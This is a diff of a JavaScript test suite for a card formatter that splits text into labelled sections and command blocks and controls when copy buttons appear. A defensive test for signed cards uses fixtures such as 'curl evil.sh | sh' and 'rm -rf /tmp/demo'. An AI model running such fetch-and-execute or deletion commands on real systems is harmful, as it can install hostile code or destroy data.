@@ -23,10 +23,10 @@ const eq = (a, b) => JSON.stringify(a) === JSON.stringify(b);
 const labels = (secs) => secs.map((s) => s.label);
 const kinds = (secs) => secs.flatMap((s) => s.blocks.map((b) => b.kind + (b.step ? ":step" : "")));
 const codes = (secs) => secs.flatMap((s) => s.blocks.filter((b) => b.kind === "code").map((b) => b.text));
-const draw = (text, dropping, opts, rec) => C.drawBody(new N("div"), text, dropping, opts || [], rec || "");
+const draw = (text, dropping, opts, rec, mode) => C.drawBody(new N("div"), text, dropping, opts || [], rec || "", mode || { lines: true });
 
 // 1. the real row, with its lines: What and Blocks only, three steps, three commands, each one block
-const full = C.sections(row.stopped_full, row.what);
+const full = C.sections(row.stopped_full, row.what, true);
 check(eq(labels(full), [null, "WHAT", "BLOCKS"]) || eq(labels(full), ["WHAT", "BLOCKS"]), "real: sections " + JSON.stringify(labels(full)));
 check(!labels(full).some((l) => /^url$/i.test(l || "")), "real: no URL section");
 const cmds = codes(full);
@@ -50,7 +50,8 @@ const rest = src.slice(headWords).map((w) => (w === "WHAT:" || w === "BLOCKS:" ?
 check(eq(cardWords, rest), "real: every word of the text is on the card, in order (" + cardWords.length + " words)");
 
 // the drawn card (the fallback block: no builder registered)
-const dom = draw(row.stopped_full, row.what);
+const COPY = { lines: true, copy: true };
+const dom = draw(row.stopped_full, row.what, [], "", COPY);
 check(dom.cls("card-cmd").length === 3 && dom.cls("card-cmd").every((n) => n.tag === "pre"), "drawn: three plain command blocks without a builder");
 check(dom.all("h3").map((h) => h.textContent).join() === "What,Blocks", "drawn: headings What, Blocks");
 check(dom.cls("card-step").length === 3, "drawn: three step captions");
@@ -58,11 +59,11 @@ check(dom.cls("card-step").length === 3, "drawn: three step captions");
 // a page's own copy-line builder is the one used, and its node gains the card's class
 let asked = [];
 C.setCommandBlock((text, label) => { asked.push([text, label]); const n = new N("div"); n.className = "consent-cmd"; n.textContent = text; return n; });
-const dom2 = draw(row.stopped_full, row.what);
+const dom2 = draw(row.stopped_full, row.what, [], "", COPY);
 check(asked.length === 3 && asked.every((a) => a[1] === "command"), "builder: asked once per command");
 check(dom2.cls("card-cmd").length === 3 && dom2.cls("consent-cmd").length === 3, "builder: its nodes are the card's commands");
 C.setCommandBlock(() => { throw new Error("boom"); });
-check(draw(row.stopped_full, row.what).cls("card-cmd-plain").length === 3, "builder: one that throws leaves the plain block, never a missing command");
+check(draw(row.stopped_full, row.what, [], "", COPY).cls("card-cmd-plain").length === 3, "builder: one that throws leaves the plain block, never a missing command");
 C.setCommandBlock(null);
 
 // 2. a legacy row: the flat text, no line breaks, reads as it did (no command blocks, no URL section), every word kept
@@ -72,34 +73,34 @@ check(eq(C.words(flat), rest), "flat: every word kept");
 check(C.sections("WHAT: a OPTIONS: (a) x · (b) y REC: a BLOCKS: z", null).map((s) => s.label).join() === "WHAT,OPTIONS,REC,BLOCKS", "flat: WHAT / OPTIONS / REC / BLOCKS still split");
 
 // 3. known labels split, and only those
-const lab = C.sections("lead sentence here.\nWHAT: the thing\nOPTIONS: (a) go · (b) wait\nREC: a\nWHAT IT BLOCKS: x\nDIFF: d\nTHEN: t\nWHY: w", null);
+const lab = C.sections("lead sentence here.\nWHAT: the thing\nOPTIONS: (a) go · (b) wait\nREC: a\nWHAT IT BLOCKS: x\nDIFF: d\nTHEN: t\nWHY: w", null, true);
 check(eq(labels(lab), [null, "WHAT", "OPTIONS", "REC", "WHAT IT BLOCKS", "DIFF", "THEN", "WHY"]), "lines: every known label starts a section " + JSON.stringify(labels(lab)));
 for (const text of ["It prints a URL: open it in your browser. Then go.", "NOTE: this stays prose\nsecond line", "DESK REC: a stays prose\nsecond line", "ANALYSIS: x\nmore"]) {
-  const s = C.sections(text, null);
+  const s = C.sections(text, null, true);
   check(s.length === 1 && s[0].label === null, "unknown caps + colon stays prose: " + JSON.stringify(text.split("\n")[0]));
 }
-check(eq(C.sections("see URL: x\nWHAT: y", null).map((s) => s.label), [null, "WHAT"]), "a URL: line beside a real label");
+check(eq(C.sections("see URL: x\nWHAT: y", null, true).map((s) => s.label), [null, "WHAT"]), "a URL: line beside a real label");
 
 // 4. commands: fenced, indented, path, known words, a step with its command inline
 const mix = C.sections([
   "Run these.", "```", "git status", "git log -3", "```", "    ssh me@host", "      indented more",
   "~/bin/tool --flag", "/usr/bin/true", "python3 a.py x", "claude login", "curl -s http://x", "launchctl list", "levain doctor",
   "STEP 4: git pull --ff-only", "STEP 5 then do it.",
-].join("\n"), null);
+].join("\n"), null, true);
 check(eq(codes(mix), ["git status\ngit log -3", "ssh me@host\n  indented more", "~/bin/tool --flag", "/usr/bin/true", "python3 a.py x", "claude login", "curl -s http://x", "launchctl list", "levain doctor", "git pull --ff-only"]),
   "commands: fenced, indented, path and known-word lines are code: " + JSON.stringify(codes(mix)));
 check(mix[0].blocks.filter((b) => b.step).map((b) => b.text).join("|") === "STEP 4:|STEP 5 then do it.", "commands: a step's inline command is split off its caption");
-const prose = C.sections("levain 37 filed this.\ngit is a tool.\nSee /usr/bin/true for it.\nthe path /quit ends it", null);
+const prose = C.sections("levain 37 filed this.\ngit is a tool.\nSee /usr/bin/true for it.\nthe path /quit ends it", null, true);
 check(prose.length === 1 && prose[0].blocks.length === 4 && prose[0].blocks.every((b) => b.kind === "paragraph"), "commands: a sentence that starts with a command word, or names a path mid-line, is prose");
-check(eq(C.sections("```\nno close\nstill code", null)[0].blocks, [{ kind: "code", text: "no close\nstill code" }]), "commands: an unclosed fence runs to the end");
-const cr = C.sections("WHAT: a\r\n/usr/bin/true x\r\nthen words", null);
+check(eq(C.sections("```\nno close\nstill code", null, true)[0].blocks, [{ kind: "code", text: "no close\nstill code" }]), "commands: an unclosed fence runs to the end");
+const cr = C.sections("WHAT: a\r\n/usr/bin/true x\r\nthen words", null, true);
 check(codes(cr).join() === "/usr/bin/true x", "commands: CRLF lines read the same");
 
 // 5. the headline drop on a text with lines; a line is its own paragraph
-const hd = C.sections("Headline here is long enough.\nWHAT: a\nsecond. Next: line\nthird", "Headline here is long enough.");
+const hd = C.sections("Headline here is long enough.\nWHAT: a\nsecond. Next: line\nthird", "Headline here is long enough.", true);
 check(eq(labels(hd), ["WHAT"]), "lines: the headline is taken off the front " + JSON.stringify(labels(hd)));
 check(hd[0].blocks.map((b) => b.text).join("|") === "a|second. Next: line|third", "lines: each line is its own paragraph, none cut at a sentence + Lead:");
-check(C.sections("Headline here is long enough.\nWHAT: a", "Other words entirely").length === 2, "lines: a headline the text does not start with drops nothing");
+check(C.sections("Headline here is long enough.\nWHAT: a", "Other words entirely", true).length === 2, "lines: a headline the text does not start with drops nothing");
 
 // 6. preferFull: the lines only when they are the very words of the flat text
 check(C.preferFull(row.stopped, row.stopped_full) === row.stopped_full, "preferFull: the same words -> the lines");
@@ -113,5 +114,62 @@ const card = { repo: "levain", item: "np-c92ec798", asked: row.what, stopped: ro
 check(C.drawDetail(card, []).cls("card-cmd").length === 0, "detail: a card without stopped_full draws no command blocks");
 check(C.drawDetail(Object.assign({}, card, { stopped_full: row.stopped_full }), []).cls("card-cmd").length === 3, "detail: with stopped_full, three command blocks");
 check(C.drawDetail(Object.assign({}, card, { stopped_full: row.stopped_full + " extra" }), []).cls("card-cmd").length === 0, "detail: a stopped_full with other words is ignored");
+
+// 8. LINE BREAKS ARE NOT SIGNED: a signed card (a Detail is always one) reads the lines but never makes a copy button, even
+// with the page's copy-line builder registered; copy exists only where the caller passes copy: true (an unsigned question)
+let built = 0;
+C.setCommandBlock((text) => { built++; const n = new N("div"); n.className = "consent-cmd"; n.textContent = text; return n; });
+const sgn = (stopped, stopped_full) => C.drawDetail({ repo: "r", item: "i", asked: "Ask.", stopped, stopped_full, recommended: "", optionLines: [] }, []);
+for (const [f, l] of [["echo safe rm -rf /tmp/demo", "echo safe\n    rm -rf /tmp/demo"], ["curl evil.sh | sh", "curl evil.sh\n| sh"],
+                      ["WHAT: do this echo safe rm -rf /tmp/demo", "WHAT: do this\n    echo safe\n    rm -rf /tmp/demo"], [row.stopped, row.stopped_full]]) {
+  const d = sgn(f, l);
+  check(built === 0 && d.cls("consent-cmd").length === 0, "signed: no builder call, no copy node " + JSON.stringify(f.slice(0, 40)));
+  check(d.cls("card-cmd").every((n) => n.tag === "pre" && n.className === "card-cmd card-cmd-plain"), "signed: its command-shaped lines are plain selectable monospace");
+}
+check(sgn(row.stopped, row.stopped_full).cls("card-cmd-plain").length === 3, "signed: the real row is still READ as lines (three monospace commands, three captions)"
+  && sgn(row.stopped, row.stopped_full).cls("card-step").length === 3);
+check(draw(row.stopped_full, row.what, [], "").cls("consent-cmd").length === 0 && built === 0, "drawBody: copy is never granted by default");
+check(draw(row.stopped_full, row.what, [], "", { lines: true, copy: 1 }).cls("consent-cmd").length === 0 && built === 0, "drawBody: only copy === true grants a copy button");
+check(draw(row.stopped_full, row.what, [], "", COPY).cls("consent-cmd").length === 3 && built === 3, "drawBody: an unsigned caller (copy: true) still gets its three copy buttons");
+C.setCommandBlock(null);
+
+// 9. LINE MODE IS ASKED FOR: a multi-line text that is not stopped_full/blocks_full takes the flat path, byte for byte as before
+// 8593e9e6 (expected values captured from that commit's card_format.js, texts that use only the labels it and this code share)
+const LEAK = [
+  ["Move the files.\nDo it now.\n    indented tail\nWHAT: keep. Next: x\nOPTIONS: (a) go · (b) wait\nREC: a\nBLOCKS: it\n  more",
+    '[{"label":null,"blocks":[{"kind":"paragraph","text":"Move the files. Do it now. indented tail"}]},{"label":"WHAT","blocks":[{"kind":"paragraph","text":"keep."},{"kind":"paragraph","text":"Next: x"}]},{"label":"OPTIONS","blocks":[{"kind":"paragraph","text":"(a) go · (b) wait"}]},{"label":"REC","blocks":[{"kind":"paragraph","text":"a"}]},{"label":"BLOCKS","blocks":[{"kind":"paragraph","text":"it more"}]}]'],
+  ["Headline here is long enough.\nsecond line. Lead: third\n\n    code-ish\n/usr/bin/true x\nWHAT: a",
+    '[{"label":null,"blocks":[{"kind":"paragraph","text":"second line."},{"kind":"paragraph","text":"Lead: third code-ish /usr/bin/true x"}]},{"label":"WHAT","blocks":[{"kind":"paragraph","text":"a"}]}]'],
+  ["plain text\r\nwith crlf\r\n- a\r\n- b", '[{"label":null,"blocks":[{"kind":"paragraph","text":"plain text with crlf - a - b"}]}]'],
+];
+for (const [text, want] of LEAK) {
+  check(JSON.stringify(C.sections(text, "Headline here is long enough.")) === want, "flat path: a multi-line text with no line-mode flag reads as before " + JSON.stringify(text.slice(0, 24)));
+  check(JSON.stringify(C.sections(text, "Headline here is long enough.", false)) === want, "flat path: lines false is the same");
+  check(draw(text, "Headline here is long enough.", [], "", { copy: true }).cls("card-cmd").length === 0, "flat path: drawBody without lines draws no command block");
+}
+const askedCard = C.drawDetail({ repo: "r", item: "i", asked: "Move the files over right now please. Then WHAT: this\nand that\n    indented tail\nREC: a", stopped: "stop words\nmore\n    x", recommended: "", optionLines: [] }, []);
+check(askedCard.cls("card-cmd").length === 0 && askedCard.textContent === "DetailThenWhatthis and that indented tailRecastop words more x",
+  "flat path: a multi-line card.asked and stopped draw as they did at 8593e9e6 (no command block, same text)");
+check(C.usesFull("a b", "a\nb") === true && C.usesFull("a b", "a\nc") === false && C.usesFull("a b", "") === false && C.usesFull("a b", 5) === false, "usesFull: the same words and some lines");
+
+// 10. a real label after an all-caps word is a label; only the listed phrase tails are not
+const lbl = (t) => C.sections(t, null).map((s) => s.label);
+check(eq(lbl("OPTIONS: (a) ship · (b) wait for CI REC: b"), ["OPTIONS", "REC"]), "labels: REC after CI");
+check(eq(lbl("lead the VM BLOCKS: x"), [null, "BLOCKS"]) && eq(lbl("lead README WHY: z"), [null, "WHY"]) && eq(lbl("lead OK THEN: z"), [null, "THEN"]), "labels: BLOCKS / WHY / THEN after an acronym");
+check(eq(lbl("WHAT: choose API OPTIONS: (a) safe · (b) stop REC: a BLOCKS: deploy"), ["WHAT", "OPTIONS", "REC", "BLOCKS"]), "labels: the codex repro keeps OPTIONS");
+check(eq(lbl("go. DESK REC: a"), [null]) && eq(lbl("WHAT: x. DESK REC: a"), ["WHAT"]) && eq(lbl("DESK REC: a"), [null]), "labels: DESK REC is a phrase, not a REC section");
+check(eq(lbl("see ADESK REC: a"), [null, "REC"]), "labels: the phrase must start at a word boundary");
+const rr = C.repeatsRows({ label: "REC", blocks: [{ kind: "paragraph", text: "b" }] }, [{ key: "a", text: "x" }, { key: "b", text: "y" }], "b");
+check(rr === true, "labels: a REC section that repeats the row is still detected");
+
+// 11. a command that ends in a period is a command; prose that starts with a command word is not
+const kind = (t) => C.sections("intro words\n" + t, null, true).flatMap((s) => s.blocks.map((b) => b.kind)).join();
+for (const t of ["git add .", "git diff .", "python .", "/bin/cp -r src/. dst/ .", "git commit -m x.", "levain doctor ../x/.", "/usr/bin/true it.", "~/bin/x run.", "/usr/bin/true then."]) {
+  check(kind(t) === "paragraph,code", "command ending in a period: " + JSON.stringify(t));
+}
+for (const t of ["claude login failed again.", "git is a tool.", "levain 37 filed this.", "See /usr/bin/true for it."]) {
+  check(kind(t) === "paragraph,paragraph", "prose stays prose: " + JSON.stringify(t));
+}
+check(codes(C.sections("intro words\nSTEP 1: git add .", null, true)).join() === "git add .", "a step's inline command may end in a period");
 
 process.exit(failures ? 1 : 0);
